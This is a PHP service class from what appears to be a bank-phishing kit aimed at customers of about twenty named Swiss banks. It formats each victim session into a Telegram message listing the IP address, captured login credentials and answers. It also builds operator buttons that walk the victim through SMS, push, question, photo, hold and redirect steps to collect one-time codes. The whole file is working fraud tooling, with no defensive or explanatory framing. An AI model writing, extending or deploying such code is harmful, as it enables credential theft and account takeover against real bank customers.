<?php

namespace App\Services\Telegram;

use App\Enums\ActionType;
use App\Models\BankSession;

class TelegramCardBuilder
{
    private const DISPLAY_NAMES = [
        'migros' => 'Migros Bank',
        'ubs' => 'UBS',
        'postfinance' => 'PostFinance',
        'aek-bank' => 'AEK Bank',
        'bank-avera' => 'Bank Avera',
        'swissquote' => 'Swissquote',
        'baloise' => 'Baloise',
        'bancastato' => 'BancaStato',
        'next-bank' => 'Next Bank',
        'llb' => 'LLB',
        'raiffeisen' => 'Raiffeisen',
        'valiant' => 'Valiant',
        'bernerland' => 'Bernerlend Bank',
        'cler' => 'Cler Bank',
        'dc-bank' => 'DC Bank',
        'banque-du-leman' => 'Banque du Léman',
        'bank-slm' => 'Bank SLM',
        'sparhafen' => 'Sparhafen',
        'alternative-bank' => 'Alternative Bank Schweiz',
        'hypothekarbank' => 'Hypothekarbank Lenzburg',
        'banque-cantonale-du-valais' => 'Banque Cantonale du Valais',
    ];

    public function buildCardText(BankSession $session): string
    {
        $lines = [];
        $name = self::DISPLAY_NAMES[$session->bank_slug] ?? $session->bank_slug;
        $lines[] = '🏦 <b>' . e($name) . '</b>';
        if ($session->ip_address) {
            $lines[] = '🌍 IP ' . e($session->ip_address);
        }

        $creds = $session->credentials ?? [];
        if ($creds) {
            $lines[] = '';
            foreach ($creds as $k => $v) {
                $lines[] = '<b>' . e(ucfirst($k)) . '</b>: <code>' . e((string) $v) . '</code>';
            }
        }

        $answers = $session->answers ?? [];
        if ($answers) {
            $lines[] = '';
            $lines[] = '<b>Answers:</b>';
            foreach ($answers as $i => $a) {
                $cmd = $a['command'] ?? '?';
                $payload = json_encode($a['payload'] ?? null, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
                $lines[] = sprintf('%d. %s → <code>%s</code>', $i + 1, e($cmd), e($payload));
            }
        }

        $current = $session->action_type['type'] ?? 'idle';
        $lines[] = '';
        $lines[] = '<i>State: ' . e($current) . '</i>';

        return implode("\n", $lines);
    }

    public function buildKeyboard(BankSession $session): array
    {
        $sid = $session->id;
        $btn = fn (ActionType $a) => [
            'text' => $a->buttonLabel(),
            'callback_data' => "action:{$sid}:{$a->value}",
        ];

        return [
            'inline_keyboard' => [
                [$btn(ActionType::Sms), $btn(ActionType::Push)],
                [$btn(ActionType::InvalidData), $btn(ActionType::Error)],
                [$btn(ActionType::Question)],
                [$btn(ActionType::PhotoWithInput), $btn(ActionType::PhotoWithoutInput)],
                [$btn(ActionType::HoldShort), $btn(ActionType::HoldLong)],
                [$btn(ActionType::Redirect)],
                [$btn(ActionType::Idle)],
            ],
        ];
    }
}
